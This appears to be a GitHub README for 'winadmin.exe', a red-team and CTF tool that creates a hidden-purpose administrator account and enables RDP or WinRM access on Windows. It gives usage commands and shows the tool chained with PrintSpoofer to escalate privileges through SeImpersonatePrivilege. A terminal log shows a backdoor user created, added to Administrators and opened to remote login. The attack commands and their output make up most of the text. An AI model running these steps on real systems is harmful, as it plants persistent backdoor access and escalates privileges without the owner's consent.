# winadmin.exe

`winadmin.exe` is a tool designed for creating a backdoor user and enabling remote access for the user in CTFs (Capture The Flag) and Red Teaming engagements. It allows you to quickly add a new user to the administrators group and enable remote access protocols like RDP (Remote Desktop Protocol) and WinRM (Windows Remote Management) on Windows systems.

## Usage

```bash
.\winadmin.exe -u <username> -p <password> [-e {rdp|winrm}]
```
OR
```bash
.\PrintSpoofer.exe -i -c "C:\Windows\Temp\winadmin.exe -u <username> -p <password> [-e {rdp|winrm}]"
```

- `-u <username>`: Specify the username for the new user.
- `-p <password>`: Specify the password for the new user.
- `-e {rdp|winrm}`: Enable remote access (RDP or WinRM) for the new user. Use `rdp` for Remote Desktop Protocol access or `winrm` for Windows Remote Management access.

**Note:** The tool must be executed with administrator privileges.

## Examples

1. To add a new user to the administrators group:

```bash
.\winadmin.exe -u kryptohaker -p P@ssw0rd1
```

2. To add a new user to the administrators group and enable RDP access:

```bash
.\winadmin.exe -u kryptohaker -p P@ssw0rd1 -e rdp
```

3. To add a new user to the administrators group and enable WinRM access:

```bash
.\winadmin.exe -u kryptohaker -p P@ssw0rd1 -e winrm
```

## Example

```
PS C:\Temp> .\winadmin.exe
.\winadmin.exe
Usage: C:\Temp\winadmin.exe -u <username> -p <password> [-e {rdp|winrm}]
  -u <username> : Specify the username for the new user.
  -p <password> : Specify the password for the new user.
  -e {rdp|winrm} : Enable remote access (RDP or WinRM) for the new user.
PS C:\Temp>
PS C:\Temp> .\PrintSpoofer.exe -i -c "C:\Temp\winadmin.exe -u kryptohaker -p P@ssw0rd1 -e rdp"        
.\PrintSpoofer.exe -i -c "C:\Temp\winadmin.exe -u kryptohaker -p P@ssw0rd1 -e rdp"                    
[+] Found privilege: SeImpersonatePrivilege                                                           
[+] Named pipe listening...                                                                           
[+] CreateProcessAsUser() OK                                                                          
The command completed successfully.                                                                   
                                                                                                      
The command completed successfully.                                                                   
                                                                                                      
The command completed successfully.                                                                   
                                                                                                      
The operation completed successfully.                                                                 
                                                                                                      
Updated 3 rule(s).                                                                                    
Ok.                                                                                                   
                                                                                                      
****************************************************                                                  
***** winadmin.exe - Backdoor User Creation Tool ******                                               
****************************************************                                                  
Author: Kryptohaker                                                                                   
URL: https://github.com/kryptohaker                                                                   
****************************************************                                                  
                                                                                                      
[+] kryptohaker user was successfully created.                                                        
[+] kryptohaker user was added to the local administrators' group.                                    
[+] RDP access was enabled for kryptohaker user.                                                      
PS C:\Temp> net user kryptohaker 

net user kryptohaker
User name                    kryptohaker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/3/2023 1:18:40 AM
Password expires             9/14/2023 1:18:40 AM
Password changeable          8/4/2023 1:18:40 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

## Disclaimer

This tool is intended for educational and ethical purposes only. Misuse of this tool for any malicious or illegal activities is strictly prohibited. The author is not responsible for any damage or loss caused by the misuse of this tool.

## License

This project is licensed under the [MIT License](LICENSE).
